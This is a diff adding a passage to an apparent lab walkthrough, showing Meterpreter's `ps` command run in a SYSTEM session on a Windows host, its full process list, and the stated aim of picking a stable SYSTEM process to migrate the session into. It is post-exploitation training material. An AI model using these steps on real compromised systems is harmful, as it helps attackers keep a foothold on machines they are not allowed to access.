@@ -1251,6 +1251,66 @@ Note the `shell` command spawns a new process (here PID 1432) and opens a channe
 </div>
 
 We've just confirmed the session runs as SYSTEM, but the session is still hosted inside whatever process the payload landed in — potentially one that is unstable or tied to the exploit. What this question is asking us to do is Enumerate processes to select a durable SYSTEM-owned process to relocate into.
+
+**Command**
+
+```
+ps
+```
+
+**Breakdown**
+
+|Component|Purpose|
+|---|---|
+|`ps`|Meterpreter built-in listing every running process with its PID, parent PID, name, architecture, session, owning user, and path.|
+
+**Result** 
+
+```shell
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 248   4     smss.exe              x64   0
+ 344   336   csrss.exe
+ 400   388   csrss.exe
+ 408   336   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 436   388   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 492   408   services.exe          x64   0
+ 500   408   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 532   492   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 560   492   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 604   492   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 688   492   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 708   436   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\system32\dwm.exe
+ 732   492   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 764   492   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 776   492   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 844   492   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 876   1432  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 884   732   badr.exe              x64   0        NT AUTHORITY\SYSTEM           C:\badr\badr.exe
+ 984   492   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1072  492   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 1300  492   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1308  884   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1316  2260  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1388  492   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1432  2260  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 1464  532   cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+ 1604  436   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1832  776   ssm-agent-worker.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
+ 1840  1832  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2260  1332  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 2300  492   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2604  1464  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+
+meterpreter > 
+```
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
